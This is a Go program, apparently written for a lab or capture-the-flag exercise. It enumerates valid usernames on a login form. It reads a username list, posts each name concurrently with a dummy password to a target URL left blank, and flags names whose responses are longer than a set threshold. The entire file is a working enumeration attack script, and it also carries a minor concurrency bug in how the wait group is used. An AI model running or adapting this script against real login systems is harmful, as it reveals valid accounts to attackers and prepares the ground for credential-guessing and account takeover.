package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const URL = ""

func main() {
	wg := sync.WaitGroup{}

	file, err := os.Open("usernames.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		for i := 0; i < 5; i++ {
			go doReq(scanner.Text(), &wg)
			wg.Add(1)
		}

		// arbitrary sleep time to prevent dos (just in-case)
		time.Sleep(10 * time.Millisecond)
	}

	wg.Wait()
}

func doReq(username string, group *sync.WaitGroup) {
	defer group.Done()

	val := url.Values{}
	val.Add("username", username)
	val.Add("password", "abc")

	res, err := http.Post(URL, "application/x-www-form-urlencoded", strings.NewReader(val.Encode()))
	if err != nil {
		panic(err)
	}

	bd, _ := ioutil.ReadAll(res.Body)

	l := len(string(bd))

	if l > 2876 {
		fmt.Println(username)
	}
}
